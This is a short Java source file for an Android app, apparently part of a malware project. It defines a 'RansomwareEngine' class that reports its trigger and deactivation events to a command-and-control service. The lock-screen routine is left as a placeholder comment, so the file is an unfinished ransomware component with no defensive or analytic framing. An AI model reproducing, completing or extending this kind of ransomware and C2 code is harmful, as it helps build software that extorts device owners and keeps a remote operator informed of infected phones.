package com.wuzenx.engine;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;

import com.wuzenx.C2Service;

public class RansomwareEngine {
    private Context context;
    private C2Service c2;
    private boolean active = false;

    public RansomwareEngine(Context context, C2Service c2) {
        this.context = context;
        this.c2 = c2;
    }

    public void trigger(String message) {
        active = true;
        if (c2 != null)
            c2.sendMessage("log", "Ransomware triggered");
        // Lock screen implementation would go here
    }

    public void deactivate() {
        active = false;
        if (c2 != null)
            c2.sendMessage("log", "Ransomware deactivated");
    }
}
